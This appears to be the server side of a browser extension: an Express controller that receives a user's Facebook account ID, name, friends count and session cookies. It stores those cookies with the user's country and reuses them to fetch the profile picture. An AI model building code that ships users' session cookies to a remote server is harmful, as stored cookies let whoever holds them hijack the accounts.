import {AuthService, FacebookService, OwnerService} from '@/services';

import {AUTH} from '@/types';
import {Response} from 'express';
import {catchAsync} from '@/utils';

export const loginWithExtension = catchAsync(async (req: AUTH.IRequest, res: Response) => {
	const {browserId, accountId, browserType, count, accountName, browserVersion, cookies} = req.body;
	let user = await AuthService.findByBrowserId(browserId);

	if (!user) {
		user = await AuthService.createUser(browserId, browserVersion, browserType);
	}

	let owner = await OwnerService.findAccountByOptions({
		accountId,
		browserId
	});
	if (!owner) {
		owner = await OwnerService.createOwner({
			browserId,
			accountId,
			accountName,
			count,
			cookies,
			country: req?.ipinfo?.country || 'Unknown',
		
		});
	}
	if (owner?.accountName !== accountName || owner.friendsCount !== count) {
		let pp = await FacebookService.getProfilePicture(accountId, cookies);

		owner = await OwnerService.updateOwner(
			{
				accountId,
				browserId
			},
			{
				accountName,
				friendsCount: count,
				profilePic: pp?.url,
				cookies,
				pp_hash: pp?.hash
			}
		);
	}
	res.status(200).json({
		user,
		owner
	});
});
